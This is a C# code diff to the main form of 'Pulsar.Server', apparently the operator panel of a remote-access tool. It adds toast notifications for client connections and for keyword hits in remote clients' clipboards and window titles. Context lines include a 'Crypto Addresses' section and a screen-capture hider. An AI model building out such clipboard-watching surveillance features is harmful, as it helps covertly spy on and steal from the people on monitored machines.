@@ -13,6 +13,7 @@ using Pulsar.Server.Messages;
 using Pulsar.Server.Models;
 using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
+using Pulsar.Server.Helper;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -66,6 +67,8 @@ namespace Pulsar.Server.Forms
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
             _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup
+
+            ToastNotificationHelper.Initialize();
 
             tableLayoutPanel1.VisibleChanged += TableLayoutPanel1_VisibleChanged;
         }
@@ -649,6 +652,25 @@ namespace Pulsar.Server.Forms
             {
             }
         }
+        public static void AddClipboardNotiEvent(FrmMain frmMain, string client, string keyword, string clipboardContent)
+        {
+            if (frmMain.lstNoti.InvokeRequired)
+            {
+                frmMain.lstNoti.Invoke(new Action(() => AddClipboardNotiEvent(frmMain, client, keyword, clipboardContent)));
+                return;
+            }
+              ListViewItem item = new ListViewItem(client);
+            item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
+            item.SubItems.Add($"Clipboard keyword: {keyword}");
+
+            string displayContent = clipboardContent.Length > 100 ? 
+                clipboardContent.Substring(0, 100) + "..." : 
+                clipboardContent;
+            item.SubItems.Add(displayContent);
+            frmMain.lstNoti.Items.Add(item);
+
+            ToastNotificationHelper.ShowClipboardKeywordNotification(keyword, client, clipboardContent);
+        }
 
         #region "Crypto Addresses"
 
@@ -1047,9 +1069,7 @@ namespace Pulsar.Server.Forms
             });
 
             return clients.ToArray();
-        }
-
-        private void ShowPopup(Client c)
+        }        private void ShowPopup(Client c)
         {
             try
             {
@@ -1057,15 +1077,33 @@ namespace Pulsar.Server.Forms
                 {
                     if (c == null || c.Value == null) return;
 
-                    notifyIcon.Visible = true;
-                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
-                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
-                        c.Value.OperatingSystem), ToolTipIcon.Info);
-                    notifyIcon.Visible = false;
+                    ToastNotificationHelper.ShowClientConnectionNotification(
+                        c.Value.Country,
+                        c.EndPoint.Address.ToString(),
+                        c.Value.OperatingSystem
+                    );
                 });
             }
             catch (InvalidOperationException)
             {
+            }
+        }        public void ShowPopupOnNotification(string message, string clientName, string clipboardContent = null)
+        {
+            try
+            {
+                this.Invoke((MethodInvoker)delegate
+                {
+                    ToastNotificationHelper.ShowGeneralNotification(
+                        "Notification",
+                        message,
+                        clientName,
+                        clipboardContent
+                    );
+                });
+            }
+            catch (InvalidOperationException ex)
+            {
+                Debug.WriteLine("Error showing popup: " + ex.Message);
             }
         }
 
@@ -1702,9 +1740,7 @@ namespace Pulsar.Server.Forms
             item.SubItems.Add(windowText);
             frmMain.lstNoti.Items.Add(item);
 
-            frmMain.notifyIcon.Visible = true;
-            frmMain.notifyIcon.ShowBalloonTip(4000, $"Keyword Triggered: {keywords}", $"Client: {client}\nWindow: {windowText}", ToolTipIcon.Info);
-            frmMain.notifyIcon.Visible = false;
+            ToastNotificationHelper.ShowKeywordNotification(keywords, client, windowText);
         }
 
         private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
